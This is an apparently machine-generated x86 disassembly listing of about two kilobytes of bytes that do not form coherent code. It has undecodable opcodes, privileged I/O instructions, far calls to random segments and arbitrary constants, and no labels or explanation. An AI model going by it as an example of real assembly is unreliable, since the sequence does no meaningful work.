  4207f9:	adc    BYTE PTR [ebp-0x3d],bl
  4207fc:	(bad)  [edi+ecx*4-0x6b542017]
  420803:	(bad)  
  420804:	ja     0x420828
  420806:	cmp    BYTE PTR [edi+edi*8],cl
  420809:	mov    ch,0x6d
  42080b:	and    al,0x7e
  42080d:	cmc    
  42080e:	mov    eax,ds:0x1c325519
  420813:	mov    esp,0xe8f2f569
  420818:	aam    0x1c
  42081a:	push   ebp
  42081b:	(bad)  
  42081c:	push   eax
  42081d:	cmp    edi,ebx
  42081f:	(bad)  
  420820:	fmul   st(5),st
  420822:	aas    
  420823:	sub    DWORD PTR [ebx],0x27
  420826:	inc    edi
  420827:	enter  0x7501,0x22
  42082b:	and    al,0x7e
  42082d:	mov    bh,0x76
  42082f:	pop    eax
  420830:	sbb    al,BYTE PTR [esi+ebp*4]
  420833:	jge    0x420806
  420835:	and    DWORD PTR [ebx+0xd28035f],ebx
  42083b:	add    dl,BYTE PTR [ebx-0x6b]
  42083e:	pop    esi
  42083f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420840:	ja     0x4208b7
  420842:	xchg   edi,eax
  420843:	inc    esi
  420844:	adc    al,0x9d
  420846:	adc    DWORD PTR [edx],0x3fd7da2a
  42084c:	mov    al,ds:0x9c567dda
  420851:	sub    BYTE PTR [ecx+0x2e],ch
  420854:	shl    ecx,1
  420856:	(bad)  
  420857:	pop    ecx
  420858:	inc    esi
  420859:	fist   WORD PTR fs:[edx]
  42085c:	mov    ch,0xd0
  42085e:	mov    dl,0x5
  420860:	enter  0xc6a4,0x88
  420864:	pushf  
  420865:	fild   DWORD PTR [ebx-0x40]
  420868:	push   esp
  420869:	dec    edi
  42086a:	lahf   
  42086b:	xor    BYTE PTR [eax-0xeae79cc],dh
  420871:	mov    bl,0x76
  420873:	sbb    al,0xfa
  420875:	mov    ds:0x391e0eee,eax
  42087a:	pop    ds
  42087b:	gs pop es
  42087d:	xor    esi,DWORD PTR [ebx-0x45]
  420880:	fistp  WORD PTR [eax+0x2b]
  420883:	neg    edi
  420885:	mov    dh,0xf8
  420887:	arpl   WORD PTR [ecx-0x5ef10cf8],ax
  42088d:	inc    ebx
  42088e:	sbb    ch,dh
  420890:	and    al,0xd3
  420892:	in     al,dx
  420893:	push   ebp
  420894:	(bad)  
  420895:	mov    bh,0x64
  420897:	xor    BYTE PTR ds:0x508651ae,0x2f
  42089e:	pop    edi
  42089f:	gs push ebx
  4208a1:	jmp    0x4208f8
  4208a3:	jg     0x4208a2
  4208a5:	fs inc ebx
  4208a7:	pop    ecx
  4208a8:	pop    ebx
  4208a9:	out    0x2c,eax
  4208ab:	mov    esp,0xd568654c
  4208b0:	cmp    al,0xd6
  4208b2:	test   ax,0x1b28
  4208b6:	sbb    bh,BYTE PTR [esi+0x79]
  4208b9:	pop    edi
  4208ba:	shr    BYTE PTR [esi-0x46d5e8af],cl
  4208c0:	cmp    eax,0x8d35ea04
  4208c5:	push   esp
  4208c6:	imul   BYTE PTR [eax-0x33803a65]
  4208cc:	mov    ds:0xb181d0f8,eax
  4208d1:	cmc    
  4208d2:	pop    ss
  4208d3:	xor    al,dl
  4208d5:	gs leave 
  4208d7:	out    dx,al
  4208d8:	in     al,dx
  4208d9:	sub    cl,ah
  4208db:	leave  
  4208dc:	mov    esi,0x7d351035
  4208e1:	not    BYTE PTR [ebx+0x30577edf]
  4208e7:	mov    BYTE PTR [eax],cl
  4208e9:	mov    edx,0x88f51d3c
  4208ee:	inc    eax
  4208ef:	cmp    DWORD PTR [edx+0x50],esi
  4208f2:	fiadd  WORD PTR [ebx+0x2bce7289]
  4208f8:	pusha  
  4208f9:	push   0xffffffab
  4208fb:	adc    BYTE PTR [ebp-0x29],0xd1
  4208ff:	inc    ebx
  420900:	enter  0x7e57,0x55
  420904:	inc    ebp
  420905:	push   edx
  420906:	(bad)  
  420907:	jno    0x4208f2
  420909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42090a:	outs   dx,DWORD PTR ds:[esi]
  42090b:	or     dl,BYTE PTR [ecx]
  42090d:	xor    eax,0xc3dc85b5
  420912:	loop   0x4208f5
  420914:	mov    eax,0x9bb9509f
  420919:	sub    eax,0x58e53c14
  42091e:	test   ebx,edx
  420920:	stc    
  420921:	xor    eax,0xdbf9f0
	...
  42092e:	add    BYTE PTR [eax],al
  420930:	add    BYTE PTR [ecx-0x57],cl
  420933:	cmp    BYTE PTR [ebp-0x2126208],bl
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2+0x2bfded90],0x35
  420942:	add    DWORD PTR [ecx],0x0
  420945:	lods   al,BYTE PTR ds:[esi]
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    dl,bh
  42094a:	test   eax,0x1ac363d4
  42094f:	xor    eax,0xeee2f968
  420954:	loopne 0x4209ad
  420956:	(bad)  
  420957:	lods   al,BYTE PTR ds:[esi]
  420958:	bound  edx,QWORD PTR [eax-0x1fac3152]
  42095e:	xchg   edi,eax
  42095f:	ret    
  420960:	or     bh,al
  420962:	mov    esp,0x65f42f8f
  420967:	stc    
  420968:	(bad)  
  420969:	cli    
  42096a:	push   cs
  42096b:	pop    ds
  42096c:	(bad)  
  42096d:	push   ebp
  42096f:	jo     0x420933
  420971:	sbb    al,0x96
  420973:	(bad)  
  420974:	js     0x42094f
  420976:	pusha  
  420977:	pop    ds
  420978:	push   ebp
  420979:	fstp   TBYTE PTR [eax]
  42097b:	jo     0x420944
  42097d:	bound  esi,QWORD PTR [ebp+0x13]
  420980:	push   ss
  420981:	push   ecx
  420982:	add    DWORD PTR [eax],edi
  420984:	lock fisub WORD PTR [ebx+0x7f]
  420988:	cmp    cl,dh
  42098a:	test   DWORD PTR [ebx+0x62],esp
  42098d:	mov    ebp,0x7c28b872
  420992:	dec    esp
  420993:	push   ecx
  420994:	lods   eax,DWORD PTR ds:[esi]
  420995:	adc    ch,BYTE PTR [esp+edi*1-0x37]
  420999:	test   ebx,ecx
  42099b:	idiv   BYTE PTR [edi+esi*2+0x2938a029]
  4209a2:	mov    ecx,0x13e6274
  4209a7:	ins    BYTE PTR es:[edi],dx
  4209a8:	mov    ds:0x9f44cc61,eax
  4209ad:	add    eax,0x56e2d953
  4209b2:	adc    eax,0x4538eadb
  4209b7:	and    al,0x8b
  4209b9:	add    esi,ebp
  4209bb:	call   0x409:0x4239da08
  4209c2:	and    DWORD PTR [edi+edx*4],ebp
  4209c5:	mov    DWORD PTR [eax],0x502158ce
  4209cb:	mov    DWORD PTR [ecx-0x7d],0x80ae8443
  4209d2:	sbb    DWORD PTR [ecx+0x169f89d2],esp
  4209d8:	cld    
  4209d9:	inc    ebx
  4209da:	add    DWORD PTR [ebx],ebp
  4209dc:	pop    es
  4209dd:	rcr    BYTE PTR [ebx-0x25],1
  4209e0:	dec    edx
  4209e1:	pop    ss
  4209e2:	arpl   sp,bp
  4209e4:	xor    al,0x82
  4209e6:	or     ebx,DWORD PTR [eax]
  4209e8:	popa   
  4209e9:	add    al,0x67
  4209eb:	(bad)  
  4209ec:	fisttp DWORD PTR [eax-0x14469d03]
  4209f2:	sbb    al,0x83
  4209f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209f5:	push   0xffffffa4
  4209f7:	sahf   
  4209f8:	add    DWORD PTR [ebp-0x33],edi
  4209fb:	mov    eax,0x8dfa25ef
  420a00:	(bad)  
  420a01:	sti    
  420a02:	pextrw esi,mm5,0x54
  420a06:	jmp    FWORD PTR [esi-0x6b22c052]
  420a0c:	cld    
  420a0d:	push   es
  420a0e:	xlat   BYTE PTR ds:[ebx]
  420a0f:	cs imul ebp,ebx,0x8b6ba3d7
  420a16:	add    edi,ebp
  420a18:	adc    ebp,DWORD PTR [ecx-0x4c]
  420a1b:	xlat   BYTE PTR ds:[ebx]
  420a1c:	aas    
  420a1d:	je     0x4209ce
  420a1f:	test   al,0xb9
  420a21:	aas    
  420a22:	pop    ss
  420a23:	xchg   ebp,eax
  420a24:	popf   
  420a25:	loope  0x420a8d
  420a27:	or     ch,BYTE PTR [ebx+ecx*1-0x4f667eda]
  420a2e:	mov    ebx,0x6675d515
  420a33:	pop    ebp
  420a34:	adc    al,0x5b
  420a36:	lods   al,BYTE PTR ds:[esi]
  420a37:	jmp    0x9861b785
  420a3c:	or     esi,DWORD PTR [eax+0x5c]
  420a3f:	push   cs
  420a40:	jmp    0x420ab7
  420a42:	push   DWORD PTR [ebx+ecx*8+0x24]
  420a46:	arpl   sp,bx
  420a48:	in     al,dx
  420a49:	or     eax,0xce9ffc42
  420a4e:	lods   al,BYTE PTR ds:[esi]
  420a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a50:	adc    BYTE PTR [ebp+0x172bece3],ch
  420a56:	add    cl,BYTE PTR [edi+0x4c]
  420a59:	repnz lea esi,[ecx+0x5c]
  420a5d:	jo     0x420aca
  420a5f:	test   WORD PTR [esi-0x4],cx
  420a63:	xchg   BYTE PTR [ecx],ah
  420a65:	(bad)  
  420a66:	jno    0x420aa3
  420a68:	mov    edi,0x2e682ad3
  420a6d:	jae    0x420a3e
  420a6f:	loope  0x420a49
  420a71:	scas   eax,DWORD PTR es:[edi]
  420a72:	adc    ecx,DWORD PTR [edx]
  420a74:	sbb    DWORD PTR [ebp-0x153ca3d7],0x33
  420a7b:	je     0x420adc
  420a7d:	or     cl,BYTE PTR [ebx+0x199548aa]
  420a83:	mov    BYTE PTR [edx],0x32
  420a86:	mov    ebp,DWORD PTR [ecx+eiz*1+0x5c]
  420a8a:	cmp    DWORD PTR [edx-0x7f67156c],ecx
  420a90:	pop    ecx
  420a91:	add    eax,0xe64976bd
  420a96:	fistp  DWORD PTR [ecx-0x6dd83f5e]
  420a9c:	into   
  420a9d:	leave  
  420a9e:	imul   ebx,esp,0x70270acf
  420aa4:	dec    esp
  420aa5:	add    eax,0x529538fa
  420aaa:	add    al,BYTE PTR [esi+0x70]
  420aad:	push   ebp
  420aae:	and    al,0x41
  420ab0:	sbb    BYTE PTR [esi+0x4a],dh
  420ab3:	sbb    ebp,ebp
  420ab5:	xor    BYTE PTR [edi+ecx*2-0x5205ca87],bl
  420abc:	mov    edi,0x4544c669
  420ac1:	fiadd  WORD PTR [ecx-0x57]
  420ac4:	sbb    cl,0x69
  420ac7:	je     0x420b48
  420ac9:	hlt    
  420aca:	fcmovnu st,st(7)
  420acc:	jecxz  0x420b30
  420ace:	sub    eax,0x61e0c362
  420ad3:	or     eax,0xb200ace8
  420ad8:	inc    ecx
  420ad9:	jae    0x420a8b
  420adb:	adc    BYTE PTR [ebx],cl
  420add:	xchg   esp,eax
  420ade:	inc    esi
  420adf:	mov    edi,0xcc6a7e0
  420ae4:	lds    ebx,FWORD PTR [edx]
  420ae6:	or     DWORD PTR [ebp-0x24],eax
  420ae9:	sbb    ah,BYTE PTR [ecx+ebp*8+0xf]
  420aed:	push   ds
  420aee:	es ret 
  420af0:	fiadd  DWORD PTR [ecx+edx*1]
  420af3:	sahf   
  420af4:	xchg   ecx,eax
  420af5:	pop    edi
  420af6:	cli    
  420af7:	jbe    0x420abe
  420af9:	fcmovnb st,st(0)
  420afb:	jecxz  0x420b6d
  420afd:	pop    esi
  420afe:	or     dl,BYTE PTR [ebx+0x67]
  420b01:	sbb    ebp,DWORD PTR [edx+0x15c7b023]
  420b07:	out    dx,eax
  420b08:	jmp    0x420a90
  420b0a:	add    DWORD PTR [esi+0x64],ecx
  420b0d:	jae    0x420b84
  420b0f:	and    dl,dl
  420b11:	xlat   BYTE PTR ds:[ebx]
  420b12:	and    al,0xeb
  420b14:	cs cmp edx,ebx
  420b17:	cmp    eax,0xa5cd23b8
  420b1c:	xlat   BYTE PTR ds:[ebx]
  420b1d:	loopne 0x420af2
  420b1f:	gs dec ecx
  420b21:	jne    0x420b05
  420b23:	mov    edi,0xd1d73cb9
  420b28:	test   DWORD PTR [ecx],edi
  420b2a:	pop    esi
  420b2b:	push   0x9f027021
  420b30:	ret    
  420b31:	imul   edx,DWORD PTR [esi-0x80],0x88c813e1
  420b38:	xor    bl,BYTE PTR [esp+edi*2+0x2f]
  420b3c:	mov    cl,BYTE PTR [ebp+0x66]
  420b3f:	mov    dl,0x27
  420b41:	cdq    
  420b42:	inc    ebx
  420b43:	test   eax,0x1df2d48d
  420b48:	ja     0x420afd
  420b4a:	pop    ss
  420b4b:	shl    BYTE PTR [ecx-0x983c65f],1
  420b51:	xchg   ebp,eax
  420b52:	shl    BYTE PTR [esp+eiz*8+0x13fb098d],cl
  420b59:	pushf  
  420b5a:	ja     0x420b20
  420b5c:	xlat   BYTE PTR ds:[ebx]
  420b5d:	jg     0x420b3d
  420b5f:	test   al,0xfd
  420b61:	and    BYTE PTR [eax],0xd6
  420b64:	jmp    0xd98677f5
  420b69:	push   ecx
  420b6a:	jmp    0x420afd
  420b6c:	push   0xc73f644e
  420b71:	dec    esp
  420b72:	add    eax,0xa6fde2fd
  420b77:	arpl   WORD PTR [eax+0x2bd60fe6],di
  420b7d:	lahf   
  420b7e:	xor    edi,DWORD PTR [ecx+esi*4+0x4716e73b]
  420b85:	mov    WORD PTR [ebx+0x547e06d7],cs
  420b8b:	aas    
  420b8c:	inc    ecx
  420b8d:	into   
  420b8e:	(bad)  
  420b8f:	sbb    bl,BYTE PTR [esi-0x4e341843]
  420b95:	repnz sub bh,cl
  420b98:	gs gs loope 0x420bd2
  420b9c:	rol    BYTE PTR ds:0xb855a6d3,1
  420ba2:	in     al,dx
  420ba3:	cmp    edx,DWORD PTR [esi+0x25597cfd]
  420ba9:	sub    cl,BYTE PTR [edi+edi*2]
  420bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bad:	arpl   WORD PTR [esi+edx*2-0x60142f51],bx
  420bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb5:	xor    dl,BYTE PTR [ebx+0x24]
  420bb8:	jmp    0xe627a731
  420bbd:	push   ebp
  420bbe:	aas    
  420bbf:	sub    ebp,DWORD PTR ds:0xa27724d2
  420bc5:	xor    bl,bh
  420bc7:	xor    al,0xc2
  420bc9:	mov    eax,0x68dbd241
  420bce:	or     dh,BYTE PTR [ebx-0xe]
  420bd1:	sahf   
  420bd2:	xchg   esi,eax
  420bd3:	and    al,0x9d
  420bd5:	mov    esi,0x385e7adb
  420bda:	dec    ebx
  420bdb:	inc    edi
  420bdc:	cs push ecx
  420bde:	std    
  420bdf:	jge    0x420c56
  420be1:	(bad)  
  420be2:	loope  0x420b74
  420be4:	jmp    0xc6b8:0x2531c6b2
  420beb:	pop    es
  420bec:	(bad)  
  420bed:	sar    BYTE PTR [ebx+edi*8],1
  420bf0:	mov    bh,0x38
  420bf2:	rcl    DWORD PTR [esi+0x6],cl
  420bf5:	and    DWORD PTR [ebp-0x7185a94e],esi
  420bfb:	sub    al,0x5b
  420bfd:	js     0x420c44
  420bff:	out    dx,eax
  420c00:	clc    
  420c01:	sub    edx,DWORD PTR es:[edx+esi*2+0x51]
  420c06:	pop    ebp
  420c07:	mov    fs,esp
  420c09:	(bad)  
  420c0b:	and    DWORD PTR [edx],ebp
  420c0d:	or     BYTE PTR [edi-0x6cb3e56b],bl
  420c13:	dec    ebx
  420c14:	add    bh,bl
  420c16:	add    DWORD PTR [esi],0x41a4cdba
  420c1c:	shl    BYTE PTR [edi-0x9c68110],0x4c
  420c23:	xor    DWORD PTR [esi],edx
  420c25:	mov    WORD PTR cs:[esp+ecx*4],?
  420c29:	ja     0x420c58
  420c2b:	fst    QWORD PTR [eax]
  420c2d:	cmp    BYTE PTR [ebx+eiz*8],0x5f
  420c31:	cmp    al,0xc1
  420c33:	mov    WORD PTR [esi],?
  420c35:	cmp    eax,0x8c7409da
  420c3a:	ins    BYTE PTR es:[edi],dx
  420c3b:	aaa    
  420c3c:	hlt    
  420c3d:	sbb    BYTE PTR [edx-0x4e],dh
  420c40:	jb     0x420c09
  420c42:	xlat   BYTE PTR ds:[ebx]
  420c43:	xor    bh,BYTE PTR [eax]
  420c45:	sub    al,BYTE PTR [ebp-0x43]
  420c48:	pop    esi
  420c49:	mov    edi,0x661bfb5b
  420c4e:	jne    0x420ca5
  420c50:	push   0xa3c9fba2
  420c55:	adc    DWORD PTR [edx],ebx
  420c57:	data16 fisub WORD PTR [edi+0x528b474f]
  420c5e:	jns    0x420c1c
  420c60:	or     bh,BYTE PTR [eax+ebp*4-0x5a7c0a5a]
  420c67:	inc    esp
  420c68:	sub    bl,BYTE PTR [ebx]
  420c6a:	sbb    ecx,ebp
  420c6c:	int    0xdb
  420c6e:	ds inc edi
  420c70:	retf   
  420c71:	fbld   TBYTE PTR [eax+0x46097852]
  420c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c78:	iret   
  420c79:	cld    
  420c7a:	call   0xb9f4:0x7eb4aa61
  420c81:	jl     0x420c94
  420c83:	loope  0x420c8c
  420c85:	cvtpi2ps xmm7,QWORD PTR [ebx+0x693a411b]
  420c8c:	pop    ecx
  420c8d:	das    
  420c8e:	call   0x98a3:0x7016aa52
  420c95:	popf   
  420c96:	sub    dl,dh
  420c98:	pop    eax
  420c99:	(bad)  
  420c9b:	mov    bl,0x45
  420c9d:	pusha  
  420c9e:	sub    DWORD PTR [eax-0x151538c2],0x5dfb66d2
  420ca8:	and    eax,0x8af04fed
  420cad:	or     ecx,DWORD PTR [eax-0x7e]
  420cb0:	(bad)  
  420cb1:	call   0xa12c:0xa0279192
  420cb8:	mov    bl,BYTE PTR [ebx+eax*1-0x7d]
  420cbc:	std    
  420cbd:	clc    
  420cbe:	and    DWORD PTR [eax-0x6d743323],0xfeebda85
  420cc8:	hlt    
  420cc9:	add    DWORD PTR [ebp+0x45ee4454],edx
  420ccf:	pop    eax
  420cd0:	inc    esi
  420cd1:	addr16 mov ebx,0xaa6f58f9
  420cd7:	and    eax,0x89a09b84
  420cdc:	je     0x420c97
  420cde:	mov    DWORD PTR [ebp+0x23],0x161a3624
  420ce5:	or     eax,0x753fcd85
  420cea:	loopne 0x420cbd
  420cec:	and    DWORD PTR ds:0x85e7daf2,0xffffff9f
  420cf3:	and    eax,0x47
	...
  420d00:	add    BYTE PTR [esi],ah
  420d02:	mov    eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	and    eax,ecx
  420d0f:	shl    ch,1
  420d11:	loope  0x420c99
  420d13:	add    DWORD PTR [eax],eax
  420d15:	lods   al,BYTE PTR ds:[esi]
  420d16:	add    eax,DWORD PTR [eax]
  420d18:	add    BYTE PTR [ebx-0x3f],bl
  420d1b:	inc    ecx
  420d1c:	nop
  420d1d:	ds push ss
  420d1f:	push   edx
  420d21:	pop    es
  420d22:	fs out 0x5a,al
  420d25:	mov    ds:0x3a0488b9,eax
  420d2a:	(bad)  
  420d2b:	xchg   ecx,eax
  420d2c:	das    
  420d2d:	push   edx
  420d2e:	rcr    bh,1
  420d30:	shr    dh,1
  420d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d33:	hlt    
  420d34:	jno    0x420cba
  420d36:	mov    ah,0xfe
  420d38:	aam    0xb4
  420d3a:	adc    edi,DWORD PTR [ebx]
  420d3c:	mov    ecx,0xc0f72dec
  420d41:	dec    esp
  420d42:	jecxz  0x420d01
  420d44:	stos   BYTE PTR es:[edi],al
  420d45:	adc    dh,al
  420d47:	mov    eax,ds:0x21d549c0
  420d4c:	sbb    al,0x7e
  420d4e:	mov    dh,BYTE PTR [edi]
  420d50:	xchg   esi,eax
  420d51:	xchg   ecx,eax
  420d52:	fsub   DWORD PTR [eax]
  420d54:	jl     0x420cef
  420d56:	cdq    
  420d57:	daa    
  420d58:	mov    ebx,DWORD PTR [edx]
  420d5a:	fsub   QWORD PTR [esi+0x32701200]
  420d60:	push   eax
  420d61:	or     BYTE PTR [ecx],cl
  420d63:	push   esp
  420d64:	push   ebp
  420d65:	retf   0x6320
  420d68:	loopne 0x420db3
  420d6a:	cmp    BYTE PTR [edx],0x78
  420d6d:	retf   
  420d6e:	and    DWORD PTR [edx],ecx
  420d70:	inc    ecx
  420d71:	adc    al,0xff
  420d73:	ins    DWORD PTR es:[edi],dx
  420d74:	dec    esp
  420d75:	add    eax,0x5a914a06
  420d7a:	add    al,BYTE PTR [ebx]
  420d7c:	ja     0x420d28
  420d7e:	xor    esp,DWORD PTR [esi]
  420d80:	popa   
  420d81:	sub    ah,BYTE PTR [ecx]
  420d83:	loopne 0x420d2f
  420d85:	jecxz  0x420d24
  420d87:	dec    ecx
  420d88:	shl    BYTE PTR [ecx+0x358e3ff0],cl
  420d8e:	sub    BYTE PTR [esi],0x94
  420d91:	loopne 0x420e04
  420d93:	cmc    
  420d94:	sub    eax,0x375dc019
  420d99:	xchg   dh,dh
  420d9b:	adc    al,0xd3
  420d9d:	mov    ds:0x2823428c,al
  420da2:	push   ds
  420da3:	gs mov bl,BYTE PTR ds:[ebp-0x2f]
  420da8:	push   esi
  420da9:	inc    edx
  420daa:	mov    cl,0xbc
  420dac:	mov    cl,0xba
  420dae:	xor    BYTE PTR [ebp-0x32],bh
  420db1:	push   ss
  420db2:	mov    ch,0x71
  420db4:	adc    bl,0x31
  420db7:	int3   
  420db8:	aaa    
  420db9:	loop   0x420dd0
  420dbb:	mov    edx,0xa03c3eab
  420dc0:	or     DWORD PTR [ebx],esi
  420dc2:	mov    esp,0xb772e5c8
  420dc7:	xchg   ecx,eax
  420dc8:	inc    esp
  420dc9:	jb     0x420d8a
  420dcb:	sub    DWORD PTR [ebx],edx
  420dcd:	lods   al,BYTE PTR ds:[esi]
  420dce:	in     eax,dx
  420dcf:	push   ds
  420dd0:	sbb    ch,BYTE PTR [ebx]
  420dd2:	push   edi
  420dd3:	fisubr DWORD PTR [ecx-0x5b84dc73]
  420dd9:	bndstx [edi+eax*8+0x78],(bad)
  420dde:	xor    BYTE PTR [ebx+0x4f],cl
  420de1:	push   ds
  420de2:	mov    bl,0x1
  420de4:	retf   0x5890
  420de7:	sti    
  420de8:	push   0xffffff8d
  420dea:	in     al,0xaa
  420dec:	push   eax
  420ded:	int3   
  420dee:	sti    
  420def:	pop    esi
  420df0:	xor    DWORD PTR [edi+eax*2],0x978ae7c1
  420df7:	fmul   QWORD PTR [ebp+0x310d45e6]
  420dfd:	adc    eax,0xdea5c78b
  420e02:	push   cs
  420e03:	adc    al,0x11
  420e05:	push   esi
  420e06:	sub    al,0xcb
  420e08:	sbb    bh,0xdd
  420e0b:	xchg   ecx,eax
  420e0c:	push   ss
  420e0d:	in     eax,0xc4
  420e0f:	fs nop
  420e11:	and    BYTE PTR [ebp-0x7382b10a],cl
  420e17:	push   esp
  420e18:	cmc    
  420e19:	sub    cl,BYTE PTR [edi+edi*1]
  420e1c:	sti    
  420e1d:	push   esp
  420e1e:	mov    ch,0x1c
  420e20:	ja     0x420dba
  420e22:	xchg   ebp,eax
  420e23:	mov    esp,0x190592ec
  420e28:	int    0xcf
  420e2a:	scas   al,BYTE PTR es:[edi]
  420e2b:	mov    eax,ds:0x60aee510
  420e30:	mov    al,ds:0xebbee784
  420e35:	retf   0xcbc9
  420e38:	in     eax,dx
  420e39:	mov    ebp,0xdd986d70
  420e3e:	inc    ecx
  420e3f:	or     BYTE PTR [esi],al
  420e41:	ds inc edx
  420e43:	dec    ebp
  420e44:	jbe    0x420eb9
  420e46:	sub    al,0x3e
  420e48:	push   esp
  420e49:	inc    esi
  420e4a:	pusha  
  420e4b:	xor    DWORD PTR [esi],edx
  420e4d:	mov    ecx,0x224bb3b6
  420e52:	mov    ebp,0xa31803b7
  420e57:	add    dh,BYTE PTR [eax+esi*1+0x4]
  420e5b:	xchg   ebp,eax
  420e5c:	mov    ds:0x58d012d2,al
  420e61:	adc    BYTE PTR [edi],bh
  420e63:	fild   QWORD PTR [eax+0x69fc99ce]
  420e69:	or     dl,BYTE PTR [ecx+edx*2+0x47]
  420e6d:	fdiv   QWORD PTR [esi]
  420e6f:	mov    WORD PTR ds:0xaa053697,ds
  420e75:	fbstp  TBYTE PTR ds:0xaec1c8e0
  420e7b:	sti    
  420e7c:	jne    0x420e21
  420e7e:	test   eax,0xd04b5aa6
  420e83:	int    0xcb
  420e85:	jne    0x420ed6
  420e87:	in     eax,dx
  420e88:	pop    ss
  420e89:	jne    0x420eb3
  420e8b:	mul    BYTE PTR [esi]
  420e8d:	sub    al,0xf9
  420e8f:	mov    esp,0xad9f4948
  420e94:	int    0x99
  420e96:	scas   al,BYTE PTR es:[edi]
  420e97:	lods   eax,DWORD PTR ds:[esi]
  420e98:	sar    BYTE PTR [esi+esi*8-0x67256c59],1
  420e9f:	cdq    
  420ea0:	pop    ebp
  420ea1:	pop    ss
  420ea2:	xlat   BYTE PTR ds:[ebx]
  420ea4:	inc    edi
  420ea5:	clc    
  420ea6:	popa   
  420ea7:	cdq    
  420ea8:	cmp    DWORD PTR cs:[edx],ebx
  420eab:	call   0xa701275a
  420eb0:	xchg   ecx,eax
  420eb1:	inc    eax
  420eb2:	mov    dh,0x90
  420eb4:	dec    ebp
  420eb5:	inc    ebp
  420eb6:	bound  ecx,QWORD PTR [ecx+eax*2+0x53]
  420eba:	pop    edi
  420ebb:	xor    BYTE PTR [edi+0x577580c4],bl
  420ec1:	je     0x420e86
  420ec3:	pop    eax
  420ec4:	mov    cs,WORD PTR [ecx+ecx*1]
  420ec7:	pop    DWORD PTR [edx]
  420ec9:	mov    dl,0x72
  420ecb:	pop    ds
  420ecc:	push   edi
  420ecd:	add    BYTE PTR [ebx*2-0x60743c37],dh
  420ed4:	pop    eax
  420ed5:	repnz out dx,eax
  420ed7:	ror    DWORD PTR [ecx+0x18032282],cl
  420edd:	aad    0xef
  420edf:	cmp    esi,ecx
  420ee1:	mov    ds:0x2a695ab9,eax
  420ee6:	sahf   
  420ee7:	push   ebp
  420ee8:	adc    ebx,DWORD PTR [ecx+0x5d]
  420eeb:	sar    DWORD PTR [edx],1
  420eed:	push   esi
  420eee:	push   ss
  420eef:	mov    edx,0x1dd37791
  420ef4:	call   0xad1c:0xfb92bdbe
  420efb:	push   cs
  420efc:	rcr    ah,0x9d
  420eff:	adc    al,0x1d
  420f01:	cli    
  420f02:	or     al,BYTE PTR [edi]
  420f04:	pop    es
  420f05:	div    DWORD PTR [eax-0xa]
  420f08:	mov    WORD PTR [ebx-0x1932ce39],gs
  420f0e:	add    DWORD PTR [ecx+ebp*8+0x50],0xffffffa9
  420f13:	and    DWORD PTR [ecx+0x4b],edi
  420f16:	mov    eax,ds:0xafb12229
  420f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f1c:	add    al,0x67
  420f1e:	jnp    0x420f4b
  420f20:	test   eax,0x7dee5de9
  420f25:	in     al,dx
  420f26:	and    al,0x14
  420f28:	out    dx,eax
  420f29:	push   ebx
  420f2a:	popf   
  420f2b:	add    eax,0x61880d42
  420f30:	jmp    0x4f31:0x560f0b72
  420f37:	and    eax,0x91e12404
  420f3c:	pop    es
  420f3d:	fimul  DWORD PTR [ecx+0x29091495]
  420f43:	mov    dl,0x9d
  420f45:	xchg   ebx,eax
  420f46:	add    al,0x76
  420f48:	int3   
  420f49:	int    0x5e
  420f4b:	dec    esp
  420f4c:	mov    bl,0xc9
  420f4e:	(bad)  
  420f4f:	shr    BYTE PTR [ebx],1
  420f51:	dec    edx
  420f52:	outs   dx,DWORD PTR ds:[esi]
  420f53:	push   ecx
  420f54:	push   ebp
  420f55:	stc    
  420f56:	gs push ebp
  420f58:	jmp    0x420fd0
  420f5a:	aas    
  420f5b:	mov    ds:0xb8399b5,eax
  420f60:	pop    esp
  420f61:	sub    al,0x66
  420f63:	dec    ecx
  420f64:	inc    ebp
  420f65:	pusha  
  420f66:	in     eax,0x15
  420f68:	stc    
  420f69:	push   edi
  420f6a:	or     DWORD PTR [ecx+edi*8-0x7f],edi
  420f6e:	loope  0x420fd4
  420f70:	pop    esi
  420f71:	dec    esp
  420f72:	and    cl,BYTE PTR [ebp+0x397cf597]
  420f78:	popa   
  420f79:	mov    DWORD PTR [ebx-0x6d],esi
  420f7c:	imul   esp,DWORD PTR [edi+0x74ea2a6b],0x5f
  420f83:	in     eax,dx
  420f84:	shl    edx,1
  420f86:	test   BYTE PTR [edx+eiz*1],cl
  420f89:	sahf   
  420f8a:	sbb    ebx,esp
  420f8c:	jnp    0x420fad
  420f8e:	ret    
  420f8f:	movups xmm4,xmm0
  420f92:	and    al,0x6a
  420f94:	pop    edi
  420f95:	mov    ecx,0x6e15d792
  420f9a:	in     al,0xb4
  420f9c:	fwait
  420f9d:	dec    edx
  420f9e:	jmp    0x420fbd
  420fa0:	and    edx,DWORD PTR ds:0xecbb00e7
  420fa6:	inc    ecx
  420fa7:	or     eax,0x2f6709db
  420fac:	push   cs
  420fad:	int3   
  420fae:	mov    ch,0x82
  420fb0:	mov    al,ds:0xb4e56c5d
  420fb5:	fwait
  420fb6:	ret    0x49f2
  420fb9:	adc    al,0x6e
  420fbb:	test   DWORD PTR [ebx],edx
  420fbd:	pop    edi
  420fbe:	inc    ebp
  420fbf:	xor    BYTE PTR [edi],dh
  420fc1:	or     eax,0x96930e02
  420fc6:	daa    
  420fc7:	(bad)  
  420fc8:	dec    edi
  420fc9:	(bad)  
  420fca:	sti    
  420fcb:	mov    ch,0xaa
  420fcd:	fcom   QWORD PTR [ebx]
  420fcf:	mov    DWORD PTR [ebp-0x62],0x92e5dc71
  420fd6:	add    ah,dh
  420fd8:	mov    ch,0x18
  420fda:	call   0xf51c:0xcacbc556
  420fe1:	popa   
  420fe2:	sub    al,0x53
  420fe4:	icebp  
  420fe5:	retf   0x5ad
